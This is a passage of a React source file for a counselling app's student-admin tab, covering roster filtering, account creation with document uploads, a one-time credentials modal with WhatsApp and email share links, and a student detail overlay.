import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { Loader2, UserPlus, Copy, Check, ChevronDown, ChevronRight, AlertCircle, KeyRound, X, MessageCircle, Mail, Link2, Search, Download, Send, Clock, ArrowLeft, ArrowRight, Archive, ArchiveRestore, Trash2, Eye, Plus, CheckCircle2 } from "lucide-react";
import { api } from "./api.js";
import { progressFor, TONE_CLASSES } from "./intakeProgress.js";
import ResumeMarkdown from "./ResumeMarkdown.jsx";
import ResumePdfPicker from "./resumePdf/index.jsx";
import useAutoRefresh from "./useAutoRefresh.js";
import RequestManualFillBanner from "./RequestManualFillBanner.jsx";
import { PANEL_CHAPTERS, CHAPTERS } from "../lib/intakeSchema.js";
import FinancialDocuments from "./FinancialDocuments.jsx";
import RecommendedDocPopup from "./RecommendedDocPopup.jsx";
import StudentDashboard, {
  extractAnswers,
  groupAnswersBySchema,
  ChapterSummaryBlock,
  DocumentPreview,
  ExtractionStep,
  buildFieldIndex,
  filesForPage,
  DocStatusBlock,
} from "./StudentDashboard.jsx";

// Students tab — visible to admin (full roster) and counsellor (own only).
// Two purposes:
//   1. Sign new students up: type username + optional lead link, get back a
//      one-time generated password the counsellor copies and sends.
//   2. Browse the roster + drill into each student's intake data, uploaded
//      files, and generated resume.
export default function StudentsAdmin({ role, counsellors = [], autoExpandStudentId = null, onAutoExpandConsumed, onStudentModalClosed, resetKey }) {
  const [students, setStudents] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  // Clicking a row opens the full-screen modal; we no longer expand
  // detail in-place. State is the student_id of the row whose modal
  // is open, or null when nothing is open.
  const [modalStudentId, setModalStudentId] = useState(null);

  // Cross-tab handoff: the IELTS panel passes a student_id when its
  // "View" button is clicked. Open the modal for that student; the
  // scroll-into-view used to be needed when this expanded inline,
  // but the modal sits over the page so the row position doesn't
  // matter anymore.
  useEffect(() => {
    if (!autoExpandStudentId) return;
    setModalStudentId(autoExpandStudentId);
    onAutoExpandConsumed?.();
  }, [autoExpandStudentId, onAutoExpandConsumed]);
  // Roster filter — case-insensitive substring match across the visible
  // metadata columns. Cheap client-side filter; server pagination is a
  // future concern (we only return the row count up to a few hundred).
  const [filter, setFilter] = useState("");
  const [credentialsModal, setCredentialsModal] = useState(null);
  const [showArchived, setShowArchived] = useState(false);
  const [subTab, setSubTab] = useState("roster");

  // When the parent clicks the Students tab (even while already on it),
  // resetKey increments and we snap back to the Roster sub-tab.
  useEffect(() => {
    if (resetKey) setSubTab("roster");
  }, [resetKey]);

  const refresh = useCallback(async () => {
    try {
      const list = await api.listStudents({ includeArchived: showArchived });
      setStudents(list);
      setError(null);
    } catch (e) {
      setError(e.message);
    }
  }, [showArchived]);

  useEffect(() => {
    let active = true;
    setLoading(true);
    refresh().finally(() => {
      if (active) setLoading(false);
    });
    return () => {
      active = false;
    };
  }, [refresh, showArchived]);

  useAutoRefresh(refresh);

  const onCreated = (account) => {
    setCredentialsModal(account);
    refresh();
  };

  // Substring filter against the same fields that show on the row card.
  const filteredStudents = useMemo(() => {
    const q = filter.trim().toLowerCase();
    if (!q) return students;
    return students.filter((s) => {
      const haystack = [
        s.username,
        s.display_name,
        s.lead_name,
        s.counsellor_name,
      ]
        .filter(Boolean)
        .join(" ")
        .toLowerCase();
      return haystack.includes(q);
    });
  }, [students, filter]);

  return (
    <div>
      <div className="mb-5 flex items-end gap-1 border-b border-stone-300">
        <StudentSubTab label="Roster" active={subTab === "roster"} onClick={() => setSubTab("roster")} />
        <StudentSubTab
          label="Documents"
          active={subTab === "financial"}
          onClick={() => setSubTab("financial")}
        />
        <StudentSubTab
          label="Communication IDs"
          active={subTab === "comms"}
          onClick={() => setSubTab("comms")}
        />
      </div>

      {subTab === "roster" && (
        <>
          <CreateStudentForm role={role} counsellors={counsellors} onCreated={onCreated} />

          <div className="mt-8 mb-3 flex flex-wrap items-baseline justify-between gap-3 border-b border-stone-300 pb-2">
            <h2 className="text-sm font-semibold uppercase tracking-[0.2em] text-black">
              {showArchived ? "Archived students" : "Students"}{students.length > 0 && (
                <span className="ml-2 text-xs font-normal text-black">
                  ({filteredStudents.length}
                  {filteredStudents.length !== students.length ? ` of ${students.length}` : ""})
                </span>
              )}
            </h2>
            <div className="flex items-center gap-2">
              {loading && <Loader2 className="h-4 w-4 animate-spin text-black" />}
              <div className="inline-flex items-center gap-1 border border-stone-300 bg-white px-2 py-1">
                <Search className="h-3 w-3 text-black" />
                <input
                  type="search"
                  value={filter}
                  onChange={(e) => setFilter(e.target.value)}
                  placeholder="filter…"
                  className="w-40 bg-transparent text-xs outline-none"
                />
              </div>
              <button
                onClick={() => { setShowArchived((v) => !v); setFilter(""); }}
                title={showArchived ? "Hide archived students" : "Show archived students"}
                className={`inline-flex items-center gap-1 border px-2 py-1 text-[10px] uppercase tracking-[0.15em] transition ${
                  showArchived
                    ? "border-stone-700 bg-stone-700 text-white hover:bg-stone-800"
                    : "border-stone-300 bg-white text-black hover:border-stone-700"
                }`}
              >
                <Archive className="h-3 w-3" /> {showArchived ? "Active" : "Archived"}
              </button>
              <button
                onClick={() => downloadStudentsCsv(filteredStudents)}
                disabled={filteredStudents.length === 0}
                title="Download visible rows as CSV"
                className="inline-flex items-center gap-1 border border-stone-300 bg-white px-2 py-1 text-[10px] uppercase tracking-[0.15em] text-black transition hover:border-stone-700 disabled:opacity-30"
              >
                <Download className="h-3 w-3" /> CSV
              </button>
            </div>
          </div>

          {error && (
            <p className="mb-3 inline-flex items-center gap-2 text-xs text-red-700">
              <AlertCircle className="h-3 w-3" /> {error}
            </p>
          )}

          {students.length === 0 && !loading && !error && (
            <p className="mt-6 text-sm  text-black">
              No students yet. Sign someone up using the form above.
            </p>
          )}
          {students.length > 0 && filteredStudents.length === 0 && (
            <p className="mt-6 text-sm  text-black">
              No students match "{filter}".
            </p>
          )}

          <div className="space-y-2">
            {filteredStudents.map((s) => (
              <StudentRow
                key={s.student_id}
                row={s}
                role={role}
                onOpen={() => setModalStudentId(s.student_id)}
                onResetPassword={(account) => setCredentialsModal(account)}
                onArchived={() => refresh()}
              />
            ))}
          </div>
          {!showArchived && students.length === 0 && !loading && !error && null /* handled above */}
        </>
      )}

      {subTab === "comms" && (
        <StudentCommsTab
          students={students}
          loading={loading}
          onResetPassword={(account) => setCredentialsModal(account)}
        />
      )}

      {subTab === "financial" && (
        <StudentDocumentsChecklist role={role} onOpenStudent={setModalStudentId} />
      )}

      {credentialsModal && (
        <CredentialsModal
          account={credentialsModal}
          onClose={() => setCredentialsModal(null)}
        />
      )}

      {modalStudentId && (
        <StudentDetailModal
          studentId={modalStudentId}
          role={role}
          onClose={() => { setModalStudentId(null); refresh(); onStudentModalClosed?.(); }}
          onActionDone={() => { setModalStudentId(null); refresh(); onStudentModalClosed?.(); }}
        />
      )}
    </div>
  );
}

// ============================================================
// CreateStudentForm — the counsellor / admin signup form.
// Admin sees an "Assign to counsellor" dropdown (required); counsellor
// session self-assigns server-side (they create students for themselves
// only — letting them pick another counsellor would shift ownership).
// ============================================================
function CreateStudentForm({ role, counsellors, onCreated }) {
  const [username, setUsername] = useState("");
  const [displayName, setDisplayName] = useState("");
  const [counsellorId, setCounsellorId] = useState("");
  const [starterFiles, setStarterFiles] = useState([]);
  const [submitting, setSubmitting] = useState(false);
  const [err, setErr] = useState(null);

  const counsellorOptions = useMemo(
    () => (Array.isArray(counsellors) ? counsellors : []),
    [counsellors]
  );

  const isAdmin = role === "admin";
  const requiresCounsellor = isAdmin;
  const canSubmit =
    !submitting && username.trim() && (!requiresCounsellor || counsellorId);

  const submit = async (e) => {
    e.preventDefault();
    setErr(null);
    setSubmitting(true);
    try {
      const payload = {
        username: username.trim(),
        display_name: displayName.trim() || null,
        counsellor_id: isAdmin ? counsellorId || null : null,
      };
      // When the counsellor has dropped starter documents in, route
      // through the bulk-upload endpoint so the row lands with the
      // ai_eligible_via_pre_upload flag set and the AI pipeline picks
      // it up on the next hourly tick. Empty file list falls through to
      // the lightweight create-only path so signups without documents
      // keep their existing single-shot behaviour.
      const account = starterFiles.length > 0
        ? await api.createStudentWithDocs(payload, starterFiles)
        : await api.createStudent(payload);
      onCreated(account);
      setUsername("");
      setDisplayName("");
      setCounsellorId("");
      setStarterFiles([]);
    } catch (e) {
      setErr(e.message);
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <form
      onSubmit={submit}
      className="rounded-none border border-stone-300 bg-white p-5"
    >
      <p className="mb-3 text-[11px] font-semibold uppercase tracking-[0.2em] text-black">
        Sign up a new student
      </p>
      <RequestManualFillBanner className="mb-4" />
      <div className={`grid grid-cols-1 gap-4 ${isAdmin ? "md:grid-cols-3" : "md:grid-cols-2"}`}>
        {isAdmin && (
          <label className="block">
            <span className="text-[10px] uppercase tracking-[0.15em] text-black">
              Assign to counsellor *
            </span>
            <select
              value={counsellorId}
              onChange={(e) => setCounsellorId(e.target.value)}
              required
              className="mt-1 w-full border-b border-stone-400 bg-transparent py-1 text-sm outline-none focus:border-stone-700"
            >
              <option value="">— select counsellor —</option>
              {counsellorOptions.map((c) => (
                <option key={c.id} value={c.id}>
                  {c.name}
                </option>
              ))}
            </select>
          </label>
        )}
        <label className="block">
          <span className="text-[10px] uppercase tracking-[0.15em] text-black">
            Username *
          </span>
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="e.g. riya_sharma"
            required
            className="mt-1 w-full border-b border-stone-400 bg-transparent py-1 text-sm outline-none focus:border-stone-700"
          />
        </label>
        <label className="block">
          <span className="text-[10px] uppercase tracking-[0.15em] text-black">
            Display name (optional)
          </span>
          <input
            type="text"
            value={displayName}
            onChange={(e) => setDisplayName(e.target.value)}
            placeholder="Riya Sharma"
            className="mt-1 w-full border-b border-stone-400 bg-transparent py-1 text-sm outline-none focus:border-stone-700"
          />
        </label>
      </div>
      <StarterDocsField files={starterFiles} onChange={setStarterFiles} />
      <div className="mt-4 flex flex-col gap-2">
        <div className="flex flex-wrap items-center gap-3">
          <button
            type="submit"
            disabled={!canSubmit}
            className="inline-flex items-center gap-2 border border-[#cc785c] bg-[#cc785c] px-4 py-2 text-xs uppercase tracking-[0.2em] text-white transition hover:bg-[#b86a4f] disabled:opacity-50"
          >
            {submitting ? <Loader2 className="h-3 w-3 animate-spin" /> : <UserPlus className="h-3 w-3" />}
            {submitting
              ? (starterFiles.length > 0 ? "Uploading…" : "Creating…")
              : (starterFiles.length > 0 ? "Create account & queue for processing" : "Create account")}
          </button>
          {err && (
            <span className="inline-flex items-center gap-1 text-xs text-red-700">
              <AlertCircle className="h-3 w-3" /> {err}
            </span>
          )}
        </div>
        {starterFiles.length > 0 && (
          <p className="text-sm text-stone-800">
            On submit, the dev is notified and runs the automation script
            from Claude Code. The student's intake form, resume, SOP, and
            LOR drafts land once that run completes.
          </p>
        )}
      </div>
    </form>
  );
}

// Two-column "ask the student for everything" checklist surfaced on the
// create-student form. Mirrors UploadEverythingCallout on the student-
// facing welcome screen — counsellor sees the same list before signing
// a student up so they remember to request both the profile AND the
// financial docs in the first conversation. Cuts the back-and-forth
// that otherwise stalls the file at visa or finance review.
function GatherEverythingCallout() {
  return (
    <div className="border-l-4 border-[#cc785c] bg-[#fdf6ef] px-5 py-4">
      <p className="text-[10px] font-semibold uppercase tracking-[0.25em] text-[#cc785c]">
        Tell the student to bring everything
      </p>
      <p className="mt-2 text-sm leading-relaxed text-stone-800">
        Ask for every document on day one. Drop whatever the student has into "Starter documents" below; the rest they'll upload themselves once logged in.
      </p>
      <ul className="mt-3 list-disc space-y-0.5 pl-5 text-[13px] text-stone-800 marker:text-stone-400">
        <li>Aadhar, PAN, passport (front/back/last)</li>
        <li>Passport-size photo</li>
        <li>10th / 11th / 12th marksheets</li>
        <li>12th admit card &amp; predicted scores</li>
        <li>UG transcripts, final degree, semester sheets</li>
        <li>IELTS / TOEFL / SAT / ACT / AP results</li>
        <li>Activity / internship / award certificates</li>
      </ul>
    </div>
  );
}

// Optional multi-file picker on the create-student form. When the
// counsellor has documents on hand at signup time (marksheets, passport,
// IELTS slip, etc.), dropping them here routes the form through
// /api/students/with-docs instead of the plain create endpoint. The
// uploads are attached to the new student row in one transaction and
// land in the AI pending queue. The dev runs the automation script
// from Claude Code on notification — the student's intake form lands
// pre-filled by the time they log in.
function StarterDocsField({ files, onChange }) {
  const onPick = (e) => {
    const picked = Array.from(e.target.files || []);
    if (picked.length === 0) return;
    // Append to whatever's already selected — multi-stage picking is
    // common on mobile (camera roll, then a fresh document scan).
    // Reset the input so re-selecting the same file fires the change.
    onChange([...files, ...picked]);
    e.target.value = "";
  };
  const removeAt = (idx) => {
    onChange(files.filter((_, i) => i !== idx));
  };
  const totalBytes = files.reduce((sum, f) => sum + (f.size || 0), 0);
  return (
    <div className="mt-5 border-t border-stone-200 pt-4">
      <GatherEverythingCallout />
      <p className="mt-4 text-[10px] uppercase tracking-[0.15em] text-black">
        Starter documents (optional)
      </p>
      <p className="mt-1 text-sm text-stone-800">
        Drop in marksheets, passport, test slips, certificates, ITRs, bank statements —
        anything you already have. On submit, the dev is notified and runs the
        automation script from Claude Code, which auto-fills the intake form and drafts
        the resume, SOP, and LOR letters.
      </p>
      {files.length > 0 && (
        <ul className="mt-3 space-y-1.5">
          {files.map((f, idx) => (
            <li key={`${f.name}-${idx}`} className="flex items-center justify-between gap-3 border border-stone-200 bg-stone-50 px-2.5 py-1.5 text-xs text-black">
              <span className="truncate">{f.name} <span className="text-stone-700">({Math.round((f.size || 0) / 1024)} KB)</span></span>
              <button
                type="button"
                onClick={() => removeAt(idx)}
                className="text-[10px] uppercase tracking-[0.15em] text-stone-700 hover:text-red-700"
              >
                Remove
              </button>
            </li>
          ))}
          <li className="text-[11px] text-stone-700">
            {files.length} file{files.length === 1 ? "" : "s"} · {Math.round(totalBytes / 1024)} KB total
          </li>
        </ul>
      )}
      <label className="mt-3 inline-flex cursor-pointer items-center gap-1 border border-stone-300 bg-white px-3 py-1.5 text-[11px] uppercase tracking-[0.15em] text-black transition hover:border-stone-700">
        <input
          type="file"
          multiple
          accept="application/pdf,image/jpeg,image/png,image/webp"
          onChange={onPick}
          className="hidden"
        />
        {files.length === 0 ? "Add documents" : "Add more"}
      </label>
    </div>
  );
}

// ============================================================
// CredentialsModal — shown after account creation or password reset.
// Three send paths so the counsellor's "send to the student" flow is
// one click instead of manual copy-paste:
//   - Open WhatsApp with the message prefilled
//   - Open the email client with subject + body prefilled
//   - Copy a plain-text version of the same message
// The message includes the login URL with ?u=username so the student's
// login form opens prefilled, plus a short list of documents to have
// ready before they start. The password is shown ONCE — clicking the
// modal away loses it forever (recovery is via Reset pw).
// ============================================================

// Required-doc checklist surfaced in the onboarding message. Mirrors
// the most common intake fields in a friendlier order. Kept here (not
// dynamically derived from the schema) so the message stays short and
// stable; if the schema grows this list should be revisited.
const REQUIRED_DOCS_FOR_MESSAGE = [
  "Class 10, 11, 12 marksheets (PDF or phone photos work)",
  "Passport (front, back, last page)",
  "Test scores: IELTS / TOEFL / SAT / AP — whichever you have",
  "2-3 letters of recommendation (LORs)",
  "Statement of purpose draft",
  "Activity / award certificates",
];

function buildOnboardingMessage(account) {
  const loginUrl = `${window.location.origin}/?u=${encodeURIComponent(account.username)}`;
  return [
    `Hi ${account.display_name || "there"},`,
    ``,
    `Your Persona account is ready. We'll use it to collect your profile + documents and generate tailored resumes for your university applications.`,
    ``,
    `🔗 Log in: ${loginUrl}`,
    `👤 Username: ${account.username}`,
    `🔑 Password: ${account.password}`,
    ``,
    `You'll need these ready (PDF or phone photo both work — your progress saves automatically, no rush):`,
    ...REQUIRED_DOCS_FOR_MESSAGE.map((d) => `  • ${d}`),
    ``,
    `Any questions, message back here.`,
  ].join("\n");
}

function CredentialsModal({ account, onClose }) {
  const [copied, setCopied] = useState(null);

  const message = buildOnboardingMessage(account);
  const loginUrl = `${window.location.origin}/?u=${encodeURIComponent(account.username)}`;
  const whatsappHref = `https://wa.me/?text=${encodeURIComponent(message)}`;
  const mailtoHref =
    `mailto:?subject=${encodeURIComponent("Your Persona account is ready")}` +
    `&body=${encodeURIComponent(message)}`;

  const copy = async (text, label) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(label);
      setTimeout(() => setCopied(null), 1500);
    } catch {
      setCopied("error");
    }
  };

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center bg-stone-900/40 p-4"
      onClick={onClose}
    >
      <div
        className="max-h-[90vh] w-full max-w-lg overflow-y-auto border border-stone-300 bg-white p-6 shadow-xl"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="mb-4 flex items-baseline justify-between">
          <p className="text-[11px] font-semibold uppercase tracking-[0.2em] text-black">
            <KeyRound className="mr-2 inline-block h-3 w-3" />
            Account ready — send to student
          </p>
          <button
            onClick={onClose}
            className="text-black hover:text-black"
            aria-label="Close"
          >
            <X className="h-4 w-4" />
          </button>
        </div>

        <p className="mb-4 text-xs text-amber-800">
          ⚠ The password is shown <strong>once</strong>. Send it now — if you close
          this modal you'll need to use <strong>Reset pw</strong> to generate a new one.
        </p>

        <CredField label="Username" value={account.username} onCopy={() => copy(account.username, "username")} copied={copied === "username"} />
        <CredField label="Password" value={account.password} onCopy={() => copy(account.password, "password")} copied={copied === "password"} mono />
        <CredField label="Login link" value={loginUrl} onCopy={() => copy(loginUrl, "url")} copied={copied === "url"} />

        {/* If the student has a student_id (always true on fresh
            creation; absent on password-reset flows where account is
            re-fetched without it), surface the AI-fill request banner
            so the counsellor can queue it before they close. */}
        {account.student_id && (
          <div className="mt-4 border-t border-stone-200 pt-4">
            <RequestManualFillBanner
              studentId={account.student_id}
              studentDisplayName={account.display_name || account.username}
            />
          </div>
        )}

        {/* Three send paths — each opens the user's preferred channel
            with a fully-formed message prefilled (login link + creds +
            required-docs checklist). Counsellor edits before sending if
            they want to. Auto-fills the student's own messenger; we
            don't talk to WhatsApp / email APIs from the server. */}
        <div className="mt-5 border-t border-stone-200 pt-4">
          <p className="mb-2 text-[10px] font-semibold uppercase tracking-[0.15em] text-black">
            Send to student
          </p>
          <div className="grid grid-cols-1 gap-2 sm:grid-cols-3">
            <a
              href={whatsappHref}
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center justify-center gap-2 border border-emerald-700 bg-emerald-700 px-3 py-2 text-[11px] uppercase tracking-[0.15em] text-white transition hover:bg-emerald-800"
            >
              <MessageCircle className="h-3 w-3" /> WhatsApp
            </a>
            <a
              href={mailtoHref}
              className="inline-flex items-center justify-center gap-2 border border-stone-700 bg-stone-700 px-3 py-2 text-[11px] uppercase tracking-[0.15em] text-white transition hover:bg-stone-800"
            >
              <Mail className="h-3 w-3" /> Email
            </a>
            <button
              onClick={() => copy(message, "message")}
              className="inline-flex items-center justify-center gap-2 border border-stone-300 bg-white px-3 py-2 text-[11px] uppercase tracking-[0.15em] text-black transition hover:border-stone-700"
            >
              {copied === "message" ? <Check className="h-3 w-3 text-emerald-700" /> : <Link2 className="h-3 w-3" />}
              {copied === "message" ? "Copied" : "Copy text"}
            </button>
          </div>
          <details className="mt-3">
            <summary className="cursor-pointer text-[10px] uppercase tracking-[0.15em] text-black hover:text-black">
              Preview message
            </summary>
            <pre className="mt-2 max-h-48 overflow-auto whitespace-pre-wrap border border-stone-200 bg-stone-50 p-2 text-[11px] text-black">
              {message}
            </pre>
          </details>
        </div>

        <button
          onClick={onClose}
          className="mt-6 w-full border border-stone-400 px-4 py-2 text-xs uppercase tracking-[0.2em] text-black hover:bg-stone-50"
        >
          I've sent them
        </button>
      </div>
    </div>
  );
}

function CredField({ label, value, onCopy, copied, mono }) {
  return (
    <div className="mb-3">
      <p className="text-[10px] uppercase tracking-[0.15em] text-black">{label}</p>
      <div className="mt-1 flex items-center justify-between gap-2 border border-stone-300 bg-stone-50 px-3 py-2">
        <span className={`select-all truncate text-sm text-black ${mono ? "font-mono" : ""}`}>
          {value}
        </span>
        <button
          onClick={onCopy}
          className="inline-flex shrink-0 items-center gap-1 border border-stone-300 bg-white px-2 py-1 text-[10px] uppercase tracking-[0.15em] text-black transition hover:border-stone-700"
        >
          {copied ? <Check className="h-3 w-3 text-emerald-700" /> : <Copy className="h-3 w-3" />}
          {copied ? "copied" : "copy"}
        </button>
      </div>
    </div>
  );
}

// Progress text per row — phase + specific step counts. Computed
// client-side from the `data` jsonb so the manifest stays a single
// source of truth in StudentIntake.jsx.
function ProgressLabel({ row }) {
  const { label, tone } = progressFor(row);
  return <span className={TONE_CLASSES[tone] || ""}>{label}</span>;
}

// ============================================================
// StudentRow — collapsed roster row + inline action buttons.
// ============================================================
function StudentRow({ row, role, onOpen, onResetPassword, onArchived }) {
  const resetPassword = async (e) => {
    e.stopPropagation();
    if (!confirm(`Reset password for "${row.username}"? The new password will be shown once.`)) return;
    try {
      const account = await api.resetStudentPassword(row.student_id);
      onResetPassword(account);
    } catch (e) {
      alert(`Reset failed: ${e.message}`);
    }
  };

  const archive = async (e) => {
    e.stopPropagation();
    const reason = prompt(`Archive "${row.display_name || row.username}"?\n\nEnter a reason (optional):`);
    if (reason === null) return; // cancelled
    try {
      await api.archiveStudent(row.student_id, reason || null);
      onArchived?.();
    } catch (e) {
      alert(`Archive failed: ${e.message}`);
    }
  };

  const unarchive = async (e) => {
    e.stopPropagation();
    if (!confirm(`Restore "${row.display_name || row.username}"?`)) return;
    try {
      await api.unarchiveStudent(row.student_id);
      onArchived?.();
    } catch (e) {
      alert(`Restore failed: ${e.message}`);
    }
  };

  const hardDelete = async (e) => {
    e.stopPropagation();
    const name = row.display_name || row.username;
    const typed = prompt(`Permanently delete ${name}?\n\nThis removes all DB rows and cannot be undone. Storage blobs are kept.\n\nType DELETE to confirm:`);
    if (typed !== "DELETE") return;
    try {
      await api.deleteStudent(row.student_id);
      onArchived?.();
    } catch (e) {
      alert(`Delete failed: ${e.message}`);
    }
  };

  return (
    <div data-student-row={row.student_id} className={`border bg-white ${row.is_archived ? "border-stone-400 opacity-60" : "border-stone-300"}`}>
      <div className="flex w-full items-center gap-3 px-4 py-3">
        <button
          onClick={onOpen}
          className="min-w-0 flex-1 text-left hover:opacity-80"
        >
          <p className="truncate font-semibold text-black">
            {row.display_name || row.username}
            {row.display_name && (
              <span className="ml-2 text-xs font-normal text-black">@{row.username}</span>
            )}
            {row.is_archived && (
              <span className="ml-2 inline-flex items-center gap-1 rounded-sm bg-stone-200 px-1.5 py-0.5 text-[9px] font-semibold uppercase tracking-[0.15em] text-stone-700">
                <Archive className="h-2.5 w-2.5" /> Archived
              </span>
            )}
          </p>
          <p className="mt-0.5 text-xs text-black">
            <ProgressLabel row={row} />
            {" · "}
            {row.file_count} files{" · "}
            {row.resume_count} resumes
            {" · "}
            <span className="text-black">{activityLabel(row)}</span>
            {row.lead_name && <> {" · "} from lead: <span className="text-black">{row.lead_name}</span></>}
            {row.counsellor_name && <> {" · "} by: {row.counsellor_name}</>}
          </p>
        </button>
        <div className="flex shrink-0 flex-wrap items-center gap-1.5">
          {!row.is_archived ? (
            <>
              <button
                onClick={resetPassword}
                className="border border-stone-300 px-2 py-1.5 text-[10px] uppercase tracking-[0.15em] text-black hover:border-stone-700"
              >
                Reset pw
              </button>
              <button
                onClick={archive}
                className="border border-amber-400 bg-amber-50 px-2 py-1.5 text-[10px] uppercase tracking-[0.15em] text-amber-800 hover:bg-amber-100"
              >
                Archive
              </button>
              {role === "admin" && (
                <button
                  onClick={hardDelete}
                  className="border border-red-400 bg-red-50 px-2 py-1.5 text-[10px] uppercase tracking-[0.15em] text-red-700 hover:bg-red-100"
                >
                  Delete
                </button>
              )}
            </>
          ) : (
            <>
              {role === "admin" && (
                <>
                  <button
                    onClick={unarchive}
                    className="border border-emerald-500 bg-emerald-50 px-2 py-1.5 text-[10px] uppercase tracking-[0.15em] text-emerald-800 hover:bg-emerald-100"
                  >
                    Restore
                  </button>
                  <button
                    onClick={hardDelete}
                    className="border border-red-400 bg-red-50 px-2 py-1.5 text-[10px] uppercase tracking-[0.15em] text-red-700 hover:bg-red-100"
                  >
                    Delete
                  </button>
                </>
              )}
            </>
          )}
          <button
            onClick={onOpen}
            className="border border-stone-400 bg-stone-100 px-3 py-1.5 text-[10px] uppercase tracking-[0.15em] text-black hover:bg-stone-200"
          >
            View →
          </button>
        </div>
      </div>
    </div>
  );
}

// ============================================================
// StudentDetailModal — full-window overlay rendered when a roster
// row is clicked. Loads the staff detail payload, then renders the
// existing paginated StudentDetail (intake pages → AI resumes →
// required docs → uploaded files) inside the modal. The modal owns
// the body-scroll lock + Esc-to-close + click-outside-to-close
// affordances; section pagination stays inside StudentDetail's
// own sticky header where it already lives.
// ============================================================
function StudentDetailModal({ studentId, role, onClose, onActionDone }) {
  const [detail, setDetail] = useState(null);
  const [loading, setLoading] = useState(true);
  const [actionBusy, setActionBusy] = useState(false);
  const [actionErr, setActionErr] = useState(null);
  const [showStudentView, setShowStudentView] = useState(false);
  const [studentPreviewData, setStudentPreviewData] = useState(null);

  const refreshDetail = useCallback(async () => {
    try {
      const d = await api.getStudent(studentId);
      setDetail(d);
    } catch (e) {
      setDetail({ error: e.message });
    }
  }, [studentId]);

  const doArchive = async () => {
    const reason = prompt("Archive reason (optional):");
    if (reason === null) return; // cancelled
    setActionBusy(true); setActionErr(null);
    try {
      await api.archiveStudent(studentId, reason || null);
      onActionDone?.();
    } catch (e) {
      setActionErr(e.message);
      setActionBusy(false);
    }
  };

  const doUnarchive = async () => {
    if (!confirm("Restore this student? They will be able to log in again.")) return;
    setActionBusy(true); setActionErr(null);
    try {
      await api.unarchiveStudent(studentId);
      onActionDone?.();
    } catch (e) {
      setActionErr(e.message);
      setActionBusy(false);
    }
  };

  const doDelete = async () => {
    const name = detail?.student?.display_name || detail?.student?.username || studentId;
    const typed = prompt(
      `Permanently delete ${name}?\n\nThis removes all rows (intake data, files, resumes, docs, sessions) from the database and cannot be undone. Storage blobs are kept.\n\nType DELETE to confirm:`
    );
    if (typed !== "DELETE") return;
    setActionBusy(true); setActionErr(null);
    try {
      await api.deleteStudent(studentId);
      onActionDone?.();
    } catch (e) {
      setActionErr(e.message);
      setActionBusy(false);
    }
  };

  useEffect(() => {
    let cancelled = false;
    setLoading(true);
    api.getStudent(studentId)
      .then((d) => { if (!cancelled) setDetail(d); })
      .catch((e) => { if (!cancelled) setDetail({ error: e.message }); })
      .finally(() => { if (!cancelled) setLoading(false); });
    return () => { cancelled = true; };
  }, [studentId]);

  // Auto-poll while any resume is mid-generation, same behaviour as
  // the old inline-expanded flow had.
  useEffect(() => {
    if (!detail || detail.error) return;
    const inflight = (detail.resumes || []).some(
      (r) => r.status === "pending" || r.status === "running"
    );
    if (!inflight) return;
    const t = setInterval(refreshDetail, 4000);
    return () => clearInterval(t);
  }, [detail, refreshDetail]);

  // Build admin preview data once detail is loaded.
  useEffect(() => {
    if (!detail || detail.error) return;
    Promise.all([
      api.listRequiredDocsForStudent(studentId).catch(() => []),
      api.listApplicationsForStudent(studentId).catch(() => []),
    ]).then(([reqDocs, apps]) => {
      // listApplicationsForStudent returns { pending, active, archived }.
      // StudentDashboard expects a flat array (matching listMyApplications shape).
      const appsFlat = Array.isArray(apps)
        ? apps
        : [...(apps.pending || []), ...(apps.active || []), ...(apps.archived || [])];
      setStudentPreviewData({
        files: detail.files || [],
        answers: extractAnswers(detail.student?.data),
        resumes: detail.resumes || [],
        requiredDocs: reqDocs,
        applications: appsFlat,
      });
    });
  }, [detail, studentId]);

  // Esc closes; lock body scroll while open.
  useEffect(() => {
    const onKey = (e) => { if (e.key === "Escape") onClose(); };
    document.addEventListener("keydown", onKey);
    const prev = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => {
      document.removeEventListener("keydown", onKey);
      document.body.style.overflow = prev;
    };
  }, [onClose]);

  const headerName =
    detail?.student?.display_name || detail?.student?.username || "Loading…";

  return (
    <div
      className="fixed inset-0 z-50 flex items-stretch justify-center overflow-y-auto bg-black/70 backdrop-blur-sm"
      onClick={onClose}
    >
      <div
        className="relative m-0 flex min-h-screen w-full max-w-6xl flex-col border-x border-stone-300 bg-[#f4f0e6] shadow-2xl sm:my-4 sm:min-h-[calc(100vh-2rem)]"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="sticky top-0 z-20 flex flex-wrap items-center justify-between gap-3 border-b border-stone-300 bg-[#f4f0e6]/95 px-5 py-4 backdrop-blur">
          <div className="min-w-0">
            <p className="text-xs font-semibold uppercase tracking-[0.2em] text-stone-700">
              Student detail
            </p>
            <p className="truncate font-serif text-2xl text-black">
              {headerName}
              {detail?.student?.is_archived && (
                <span className="ml-3 inline-flex items-center gap-1 rounded-sm bg-stone-300 px-2 py-0.5 text-[11px] font-semibold uppercase tracking-[0.12em] text-stone-700">
                  <Archive className="h-3 w-3" /> Archived
                </span>
              )}
            </p>
            {actionErr && (
              <p className="mt-1 text-xs text-red-700">{actionErr}</p>
            )}
          </div>
          <div className="flex shrink-0 flex-wrap items-center gap-2">
            {detail && !detail.error && (
              <button
                onClick={() => setShowStudentView(true)}
                title="Open the student's panel as they see it"
                className="inline-flex shrink-0 items-center gap-1 border border-stone-400 bg-white px-3 py-1.5 text-xs uppercase tracking-[0.15em] text-black transition hover:border-stone-700 hover:bg-stone-50"
              >
                <Eye className="h-3.5 w-3.5" /> Student view
              </button>
            )}
            {(detail?.files || []).some((f) => !f.superseded_at) && (
              <a
                href={`/api/students/${studentId}/files/all.zip`}
                title="Download every active uploaded document for this student as a single ZIP"
                className="inline-flex shrink-0 items-center gap-2 bg-stone-900 px-4 py-2 text-xs font-semibold uppercase tracking-[0.12em] text-white transition hover:bg-stone-700"
              >
                <Download className="h-4 w-4" />
                Batch download all uploaded documents
              </a>
            )}
